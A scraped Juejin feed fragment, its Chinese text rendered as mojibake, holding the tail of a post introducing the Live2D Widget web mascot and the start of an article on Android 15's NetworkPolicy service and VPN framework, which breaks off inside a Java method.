é©±åŠ¨çš„å¼€æºé¡¹ç›®å³å¯ä¸ºåšå®¢ã€ä¸ªäººä¸»é¡µæˆ–ä»»ä½•ç½‘é¡µèµ‹äºˆçµåŠ¨çš„ç”Ÿå‘½ã€‚å¥¹ä¸ä»…ä¼šçœ¨çœ¼ã€è½¬å¤´ï¼Œè¿˜èƒ½ä¸è®¿å®¢è¿›è¡Œç®€å•çš„äº’åŠ¨ï¼Œç¬é—´æå‡ç½‘ç«™çš„è¶£å‘³æ€§ä¸äº²å’ŒåŠ›ã€‚æ— è®ºæ˜¯æŠ€æœ¯æå®¢è¿½æ±‚çš„å¯å®šåˆ¶æ€§ï¼Œè¿˜æ˜¯æ™®é€šç”¨æˆ·å‘å¾€çš„è½»æ¾é›†æˆï¼ŒLive2D Widget éƒ½èƒ½æ»¡è¶³ã€‚è·Ÿéšæœ¬æ–‡ï¼Œä¸€åˆ†é’Ÿå”¤é†’ä½ çš„ç½‘é¡µï¼Œè®©æ•°å­—ä¸–ç•Œå¤šä¸€ä½æ¸©æš–é™ªä¼´ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd576edbe3ad41b1936bf7d5f7597118~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=S2GWwDDWOBKxw5BHsbPTxmr6mKM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">ğŸ¯é¡¹ç›®ä»‹ç»</h2>
<ul>
<li>â€¢Â <strong>é¡µé¢äº’åŠ¨</strong>ï¼šåœ¨ç½‘é¡µä¸­æ·»åŠ  Live2D çœ‹æ¿å¨˜</li>
<li>â€¢Â <strong>æ˜“äºé›†æˆ</strong>ï¼š æ ¸å¿ƒä»£ç ç”± TypeScript ç¼–å†™ï¼Œæ˜“äºé›†æˆï¼Œåªéœ€ä¸€è¡Œä»£ç ï¼Œå³å¯ä¸ºç½‘ç«™æ·»åŠ çœ‹æ¿å¨˜</li>
<li>â€¢Â <strong>è½»é‡çº§è®¾è®¡</strong>ï¼šé™¤Live2Dæ ¸å¿ƒåº“å¤–æ— é¢å¤–ä¾èµ–ï¼ŒåŠ è½½è¿…é€Ÿ</li>
<li>â€¢Â <strong>é«˜åº¦å¯å®šåˆ¶</strong>ï¼šæ”¯æŒå¤šç§é…ç½®é€‰é¡¹ï¼Œå®Œç¾é€‚é…ä½ çš„ç½‘ç«™é£æ ¼</li>
</ul>
<p>githubåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fstevenjoezhang%2Flive2d-widget%2F" title="https://github.com/stevenjoezhang/live2d-widget/" target="_blank" ref="nofollow noopener noreferrer">github.com/stevenjoezhâ€¦</a></p>
<p>å®˜ç½‘åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.live2d.com%2Fen%2F" title="https://www.live2d.com/en/" target="_blank" ref="nofollow noopener noreferrer">www.live2d.com/en</a></p>
<p>è¯¥é¡¹ç›®ç›®å‰åœ¨githubä¸Šå·²æœ‰Â <strong>10.4k</strong>Â â­ï¸ star</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56226e3cc71d4a5a9cce847368a88ce8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=HgYpHhaZIZ0%2FfGufjdRGh5HevKc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">âš¡å¿«é€Ÿå¼€å§‹ï¼šä¸€åˆ†é’Ÿé›†æˆ</h2>
<p>å¯¹äºå¤§å¤šæ•°ç”¨æˆ·æ¥è¯´ï¼Œé›†æˆè¿‡ç¨‹ç®€å•å¾—ä»¤äººæƒŠå–œï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!--Â åªéœ€åœ¨é¡µé¢ä¸­æ·»åŠ è¿™è¡Œä»£ç Â --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>Â <span class="hljs-attr">src</span>=<span class="hljs-string">"https://fastly.jsdelivr.net/npm/live2d-widgets@1.0.0/dist/autoload.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>æˆ‘çš„åšå®¢é¡µé¢Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fxiuji008.github.io%2F" title="https://xiuji008.github.io/" target="_blank" ref="nofollow noopener noreferrer">xiuji008.github.io/</a>Â å·²ç»é›†æˆäº†ï¼Œå®¶äººä»¬å¯ä»¥ç§»æ­¥è¿‡å»çœ‹çœ‹æ•ˆæœï¼Œä»¥ä¸‹æ˜¯ä¸€äº›æ•ˆæœå›¾</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d63dcb3ef48413aabc0193f150e9f58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=d3P9XCVGoCsNmrV3NsKGmYtwuRw%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17cf9f6e9ca848b49f05292f6bb2dbcc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=UTcCSB4AvxQ7rPlmuAc7puEUdKQ%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/052107358d3d48228059f96ac18c0c86~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=%2BiuQOuSiZC%2Bc9lxG4tYzci%2BMXlg%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1c7f24f20b74312ae3fafb56c13353a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=xjXL%2FxU%2F8RBlrtECJzR2QbMAP9o%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a0ff90acb3946908e8104dbe2ea4356~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=X6B6kvk5NEWTSUT3lPiBXR1CFUk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a6fd8c0e73c467a9bbd03365d57556e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=Ca4uXQBX3g7jCnr5RMsRSAHoI98%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47e26f3e986144278e69c67da096f1b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=IN8HQd6o0RjQarzh8XYPywFWaKc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">ğŸ–ï¸è¿›é˜¶</h2>
<p>å¦‚æœä½ æ˜¯å°ç™½ï¼Œæˆ‘ä»¬é€šè¿‡ä¸Šè¾¹ä»‹ç»çš„é‚£è¡Œä»£ç å°±å·²ç»æŠŠçœ‹æ¿å¨˜é›†æˆè¿›æ¥äº†ã€‚ä½†æ˜¯å¦‚æœä½ æƒ³è®©çœ‹æ¿å¨˜æ›´é€‚åˆä½ çš„ç½‘ç«™ï¼Œä½ å¯ä»¥é€šè¿‡è¿›ä¸€æ­¥çš„é…ç½®åŠå¼€å‘æ¥å®Œæˆï¼Œæ„Ÿå…´è¶£çš„å®¶äººä»¬å¯ä»¥è‡ªè¡Œç ”ç©¶ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29ac25e4a2d549359792aceaf296dcee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=MnBOvLdv%2BY5TjZ4qm%2FELZIRYYSA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b028c73e1a0482dbb5d2cd93f0fcd87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=vfxJ9FSZzhz9QD0nXCE9zxilucE%3D" alt="" loading="lazy"/></p>
<p>ç›¸å…³æŠ€æœ¯åšæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.fghrsh.net%2Fpost%2F123.html" target="_blank" title="https://www.fghrsh.net/post/123.html" ref="nofollow noopener noreferrer">www.fghrsh.net/post/123.htâ€¦</a></p>
<h2 data-id="heading-3">ğŸ“ æ€»ç»“ï¼šè®©ç½‘é¡µæ´»èµ·æ¥</h2>
<p>Live2D Widgetä¸ä»…ä»…æ˜¯ä¸€ä¸ªæŠ€æœ¯é¡¹ç›®ï¼Œå®ƒä»£è¡¨äº†ç½‘é¡µäº¤äº’çš„æ–°å¯èƒ½ã€‚åœ¨è¿™ä¸ªæ•°å­—åŒ–çš„æ—¶ä»£ï¼Œä¸€ä¸ªçµåŠ¨çš„çœ‹æ¿å¨˜èƒ½å¤Ÿï¼š</p>
<ul>
<li>â€¢ æå‡ç”¨æˆ·ä½“éªŒå’Œåœç•™æ—¶é—´</li>
<li>â€¢ å¢åŠ ç½‘ç«™çš„ç‰¹è‰²å’Œè®°å¿†ç‚¹</li>
<li>â€¢ å±•ç¤ºæŠ€æœ¯å®åŠ›å’Œåˆ›æ„ç²¾ç¥</li>
</ul>
<p>æ— è®ºä½ æ˜¯æŠ€æœ¯çˆ±å¥½è€…ã€åšä¸»è¿˜æ˜¯ç½‘ç«™å¼€å‘è€…ï¼ŒLive2D Widgetéƒ½èƒ½ä¸ºä½ çš„é¡¹ç›®å¢æ·»ç‹¬ç‰¹çš„é­…åŠ›ã€‚ç«‹å³å°è¯•ï¼Œè®©ä½ çš„ç½‘ç«™æ‹¥æœ‰ä¸€ä¸ªéšæ—¶é™ªä¼´è®¿å®¢çš„å¯çˆ±ä¼™ä¼´å§ï¼</p>
<p>è®©æŠ€æœ¯æ›´æœ‰æ¸©åº¦ï¼Œè®©ç½‘é¡µæ›´æœ‰ç”Ÿå‘½ï¼ğŸš€</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android 15ç½‘ç»œå­ç³»ç»Ÿæ·±åº¦è§£æï¼ˆäºŒï¼‰ï¼šNetworkPolicyæµé‡æ§åˆ¶ã€VPNæ¡†æ¶ä¸ç½‘ç»œä¼˜åŒ–å…¨è§£æ]]></title>    <link>https://juejin.cn/post/7600863478929915923</link>    <guid>https://juejin.cn/post/7600863478929915923</guid>    <pubDate>2026-01-30T13:01:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600863478929915923" data-draft-id="7600994087587561491" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android 15ç½‘ç»œå­ç³»ç»Ÿæ·±åº¦è§£æï¼ˆäºŒï¼‰ï¼šNetworkPolicyæµé‡æ§åˆ¶ã€VPNæ¡†æ¶ä¸ç½‘ç»œä¼˜åŒ–å…¨è§£æ"/> <meta itemprop="keywords" content="Android,ç½‘ç»œåè®®,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2026-01-30T13:01:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†¬å¥‡Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android 15ç½‘ç»œå­ç³»ç»Ÿæ·±åº¦è§£æï¼ˆäºŒï¼‰ï¼šNetworkPolicyæµé‡æ§åˆ¶ã€VPNæ¡†æ¶ä¸ç½‘ç»œä¼˜åŒ–å…¨è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†¬å¥‡Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:01:53.000Z" title="Fri Jan 30 2026 13:01:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»18åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬æ·±å…¥æ¢ç´¢äº†ConnectivityServiceçš„ç½‘ç»œç®¡ç†æ¡†æ¶ã€‚ä»Šå¤©ï¼Œæˆ‘ä»¬å°†èšç„¦äºç½‘ç»œå­ç³»ç»Ÿçš„å¦å¤–ä¸¤ä¸ªæ ¸å¿ƒåŠŸèƒ½ï¼š<strong>ç½‘ç»œç­–ç•¥ç®¡ç†</strong>å’Œ<strong>VPNæ¡†æ¶</strong>ã€‚</p>
<h3 data-id="heading-1">ä¸ºä»€ä¹ˆéœ€è¦ç½‘ç»œç­–ç•¥ç®¡ç†ï¼Ÿ</h3>
<p>æƒ³è±¡è¿™æ ·çš„åœºæ™¯ï¼š</p>
<p><strong>åœºæ™¯1ï¼šæµé‡å¤±æ§</strong></p>
<pre><code class="hljs language-diff" lang="diff">ç”¨æˆ·æœˆåº•æ”¶åˆ°è¿è¥å•†çŸ­ä¿¡ï¼š"æ‚¨çš„æµé‡å·²ç”¨å®Œ95%"
æŸ¥çœ‹ç³»ç»Ÿè®¾ç½®å‘ç°ï¼š
<span class="hljs-deletion">- æŸä¸ªåå°åº”ç”¨å·å·ä¸‹è½½äº†2GBæ›´æ–°åŒ…</span>
<span class="hljs-deletion">- å¤šä¸ªåº”ç”¨åœ¨åå°åŒæ­¥æ•°æ®</span>
<span class="hljs-deletion">- ç³»ç»ŸæœåŠ¡æŒç»­ä¸Šä¼ ç»Ÿè®¡æ•°æ®</span>
</code></pre>
<p><strong>åœºæ™¯2ï¼šç”µé‡å‘Šæ€¥</strong></p>
<pre><code class="hljs language-diff" lang="diff">ç”¨æˆ·å¤–å‡ºå‘ç°ï¼š
<span class="hljs-deletion">- æ‰‹æœºåªå‰©15%ç”µé‡</span>
<span class="hljs-deletion">- ä½†è‡³å°‘è¿˜è¦2å°æ—¶æ‰èƒ½å……ç”µ</span>
<span class="hljs-deletion">- å¾ˆå¤šåº”ç”¨è¿˜åœ¨åå°è”ç½‘æ¶ˆè€—ç”µé‡</span>
</code></pre>
<p>è¿™æ—¶å€™ï¼ŒAndroidçš„**NetworkPolicyï¼ˆç½‘ç»œç­–ç•¥ï¼‰**ç³»ç»Ÿå°±æ´¾ä¸Šç”¨åœºäº†ï¼</p>
<h3 data-id="heading-2">æœ¬æ–‡å†…å®¹æ¦‚è§ˆ</h3>
<ol>
<li>
<p><strong>NetworkPolicyæµé‡æ§åˆ¶</strong></p>
<ul>
<li>NetworkPolicyManagerServiceæ¶æ„</li>
<li>Data Saverçœæµæ¨¡å¼</li>
<li>æŒ‰æµé‡è®¡è´¹ç½‘ç»œè¯†åˆ«</li>
<li>æµé‡ç»Ÿè®¡ä¸é™åˆ¶</li>
</ul>
</li>
<li>
<p><strong>VPNæ¡†æ¶æ·±åº¦è§£æ</strong></p>
<ul>
<li>VpnServiceå·¥ä½œåŸç†</li>
<li>TUN/TAPè™šæ‹Ÿç½‘å¡</li>
<li>VPNè·¯ç”±é…ç½®</li>
<li>Always-on VPN</li>
</ul>
</li>
<li>
<p><strong>ç½‘ç»œæ€§èƒ½ä¼˜åŒ–</strong></p>
<ul>
<li>æµé‡ä¼˜åŒ–æŠ€å·§</li>
<li>DNSä¼˜åŒ–</li>
<li>è¿æ¥æ± ç®¡ç†</li>
<li>ç½‘ç»œè¯Šæ–­å·¥å…·</li>
</ul>
</li>
<li>
<p><strong>Android 15æ–°ç‰¹æ€§</strong></p>
<ul>
<li>eBPFç½‘ç»œç­–ç•¥</li>
<li>VPNæ”¹è¿›</li>
<li>ç½‘ç»œåˆ‡ç‰‡æ”¯æŒ</li>
</ul>
</li>
</ol>
<p>è®©æˆ‘ä»¬å¼€å§‹è¿™æ®µæ·±å…¥Androidç½‘ç»œæ ¸å¿ƒçš„æ—…ç¨‹ï¼</p>
<hr/>
<h2 data-id="heading-3">ä¸€ã€NetworkPolicyæµé‡æ§åˆ¶æ·±åº¦è§£æ</h2>
<h3 data-id="heading-4">1.1 NetworkPolicyManagerServiceæ¶æ„æ€»è§ˆ</h3>
<p><strong>æºç ä½ç½®</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">packages/modules/Connectivity/service/src/com/android/server/net/NetworkPolicyManagerService.java
</code></pre>
<h4 data-id="heading-5">æ¶æ„å›¾</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9db9684602f34435b9f8a79f74847575~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770382913&amp;x-signature=S9bxGlNgI9ZQbzajGT%2BqayJ%2Bn48%3D" alt="08-01-network-policy-architecture.png" loading="lazy"/></p>
<p><strong>æ ¸å¿ƒèŒè´£</strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   NetworkPolicyManagerService æ ¸å¿ƒåŠŸèƒ½  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ <span class="hljs-number">1.</span> æµé‡ç›‘æ§                             â”‚
â”‚    - å®æ—¶ç»Ÿè®¡åº”ç”¨æµé‡                   â”‚
â”‚    - æŒ‰UID/Interfaceç»Ÿè®¡                â”‚
â”‚    - å†å²æµé‡è®°å½•                       â”‚
â”‚                                        â”‚
â”‚ <span class="hljs-number">2.</span> ç­–ç•¥æ‰§è¡Œ                             â”‚
â”‚    - Data Saveræ¨¡å¼                    â”‚
â”‚    - App Standbyé™åˆ¶                   â”‚
â”‚    - æŒ‰æµé‡è®¡è´¹ç½‘ç»œæ§åˆ¶                 â”‚
â”‚                                        â”‚
â”‚ <span class="hljs-number">3.</span> æµé‡é™åˆ¶                             â”‚
â”‚    - åå°æ•°æ®ç¦ç”¨                       â”‚
â”‚    - æµé‡é…é¢ç®¡ç†                       â”‚
â”‚    - é˜²ç«å¢™è§„åˆ™                         â”‚
â”‚                                        â”‚
â”‚ <span class="hljs-number">4.</span> ç½‘ç»œè¯†åˆ«                             â”‚
â”‚    - Metered/UnmeteredåŒºåˆ†             â”‚
â”‚    - <span class="hljs-built_in">WiFi</span>/ç§»åŠ¨ç½‘ç»œåˆ¤æ–­                  â”‚
â”‚    - è¿è¥å•†è®¡è´¹ç­–ç•¥                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-6">æ ¸å¿ƒæ•°æ®ç»“æ„</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// packages/modules/Connectivity/.../NetworkPolicyManagerService.java</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkPolicyManagerService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">INetworkPolicyManager</span>.Stub {

    <span class="hljs-comment">// ç½‘ç»œç­–ç•¥é›†åˆ (æŒ‰NetworkTemplateåˆ†ç±»)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ArrayMap&lt;NetworkTemplate, NetworkPolicy&gt; mNetworkPolicy =
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayMap</span>&lt;&gt;();

    <span class="hljs-comment">// UIDç­–ç•¥ (æ¯ä¸ªåº”ç”¨çš„ç½‘ç»œé™åˆ¶ç­–ç•¥)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">SparseIntArray</span> <span class="hljs-variable">mUidPolicy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SparseIntArray</span>();

    <span class="hljs-comment">// UIDè§„åˆ™ (é˜²ç«å¢™è§„åˆ™ï¼šå…è®¸/æ‹’ç»)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">SparseIntArray</span> <span class="hljs-variable">mUidRules</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SparseIntArray</span>();

    <span class="hljs-comment">// æŒ‰æµé‡è®¡è´¹ç½‘ç»œé›†åˆ</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ArraySet&lt;NetworkTemplate&gt; mMeteredIfaces = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArraySet</span>&lt;&gt;();

    <span class="hljs-comment">// Data Saveræ¨¡å¼å¼€å…³</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">mRestrictBackground</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

    <span class="hljs-comment">// æ ¸å¿ƒæ–¹æ³•1ï¼šè®¾ç½®UIDç½‘ç»œç­–ç•¥</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUidPolicy</span><span class="hljs-params">(<span class="hljs-type">int</span> uid, <span class="hljs-type">int</span> policy)</span> {
        mContext.enforceCallingOrSelfPermission(MANAGE_NETWORK_POLICY, TAG);

        <span class="hljs-comment">// 1. æ›´æ–°ç­–ç•¥</span>
        <span class="hljs-keyword">if</span> (policy == POLICY_NONE) {
            mUidPolicy.delete(uid);
        } <span class="hljs-keyword">else</span> {
            mUidPolicy.put(uid, policy);
